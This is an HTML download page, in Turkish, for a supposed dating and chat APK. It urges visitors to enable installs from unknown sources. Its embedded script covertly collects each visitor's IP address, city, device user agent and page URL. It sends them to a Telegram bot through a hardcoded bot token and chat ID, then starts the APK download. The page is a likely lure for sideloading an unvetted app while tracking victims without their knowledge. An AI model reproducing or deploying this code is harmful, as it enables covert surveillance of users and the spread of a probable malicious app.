<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tanışma & Sohbet APK</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #0f0f0f, #1a1a2e);
            color: #fff;
            text-align: center;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .header {
            background: rgba(0, 255, 157, 0.15);
            padding: 15px 40px;
            border-radius: 12px;
            margin-bottom: 30px;
            font-size: 1.9em;
            font-weight: bold;
            color: #00ff9d;
        }
        .description {
            font-size: 1.3em;
            margin: 20px 0 40px 0;
            max-width: 620px;
            line-height: 1.5;
        }
        .download-btn {
            background: linear-gradient(90deg, #00ff9d, #00cc7a);
            color: #000;
            font-size: 1.6em;
            font-weight: bold;
            padding: 20px 70px;
            border-radius: 50px;
            text-decoration: none;
            box-shadow: 0 10px 30px rgba(0, 255, 157, 0.5);
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .download-btn:hover {
            transform: scale(1.08);
            box-shadow: 0 15px 35px rgba(0, 255, 157, 0.7);
        }
        .warning {
            margin-top: 60px;
            color: #ffcc00;
            font-size: 1.05em;
        }
    </style>
</head>
<body>

    <div class="header">👋 Tanışma & Sohbet Uygulaması</div>
    
    <p class="description">
        Android için özel sohbet ve tanışma uygulaması hazır!<br>
        Aşağıdaki butona basarak APK’yı indirebilirsin.
    </p>

    <a href="#" onclick="handleDownload()" class="download-btn">
        📲 APK’yı İndir
    </a>

    <p class="warning">İndirdikten sonra bilinmeyen kaynaklardan yüklemeye izin verin.</p>

    <!-- Telegram Log Script -->
    <script>
        // ============== AYARLARINI BURAYA YAP ==============
        const BOT_TOKEN = "8634800611:AAFEuAx4nw7VbV-942w5Ku4OO0u_2c15Gc4";
        const CHAT_ID   = "-1003887845842";           // Sayı olarak yaz (örn: 123456789)

        const APK_URL   = "uygulaman.apk";   // APK dosyasının tam linki (aynı klasördeyse bu yeter)
        const APK_NAME  = "TanismaSohbet.apk";

        async function sendLogToTelegram() {
            const ipInfo = await fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .catch(() => ({}));

            const message = `📥 *APK İndirildi!*\n\n` +
                `🕒 *Zaman:* ${new Date().toLocaleString('tr-TR')}\n` +
                `🌐 *IP:* \`${ipInfo.ip || 'Bilinmiyor'}\`\n` +
                `📍 *Şehir:* ${ipInfo.city || 'Bilinmiyor'}\n` +
                `📱 *Cihaz:* ${navigator.userAgent}\n` +
                `🔗 *Sayfa:* ${window.location.href}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.log("Log gönderilemedi:", err));
        }

        function handleDownload() {
            // Log gönder
            sendLogToTelegram();

            // 300ms sonra indirmeyi başlat (logun gitmesi için biraz zaman)
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = APK_URL;
                link.download = APK_NAME;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 300);
        }
    </script>

</body>
</html>
